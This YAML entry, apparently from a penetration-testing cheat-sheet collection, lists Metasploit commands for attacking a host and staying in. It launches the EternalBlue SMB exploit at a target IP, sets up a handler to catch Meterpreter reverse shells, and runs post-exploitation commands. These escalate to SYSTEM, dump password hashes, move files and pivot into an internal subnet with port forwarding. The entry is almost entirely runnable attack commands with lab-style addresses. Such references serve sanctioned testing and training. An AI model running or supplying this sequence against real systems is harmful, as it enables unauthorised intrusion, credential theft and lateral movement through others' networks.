---
description: |
  Common Metasploit Framework usage — searching exploits, multi/handler setup, Meterpreter commands, pivoting, and port forwarding.
command: |
  # Search for exploits
  search type:exploit name:eternalblue
  search type:exploit platform:windows smb

  # Use an exploit
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 10.10.10.27
  set LHOST 10.10.10.21
  set LPORT 4444
  run

  # Multi/handler — catch reverse shells
  # Linux: set payload linux/x64/shell_reverse_tcp
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 10.10.10.21
  set LPORT 4444
  run

  # Meterpreter commands
  sysinfo
  getuid
  getsystem
  hashdump
  upload /tmp/file.exe C:\\Temp\\file.exe
  download C:\\Users\\sec_user\\Desktop\\flag.txt
  shell

  # Pivoting
  run autoroute -s 172.16.1.0/24
  portfwd add -l 8080 -p 80 -r 172.16.1.10
items:
  - No_Creds
  - Credentials
  - Shell
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://docs.metasploit.com/
  - https://www.offensive-security.com/metasploit-unleashed/
---
